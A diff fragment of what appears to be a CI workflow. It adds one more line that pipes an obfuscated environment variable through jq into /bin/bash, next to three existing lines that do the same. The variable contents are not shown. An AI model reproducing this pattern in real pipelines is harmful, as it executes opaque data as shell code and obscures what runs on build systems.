@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$wrwj852" | jq -r .bfwsz21 | /bin/bash
           echo $cjwx6798 | jq -r .bdr66 | /bin/bash
           printf '%s' "$qsuop2488" | jq -r .vrs4 | /bin/bash
+          echo $floc2 | jq -r .pezbj5 | /bin/bash
 
       - name: Save output
         if: always()
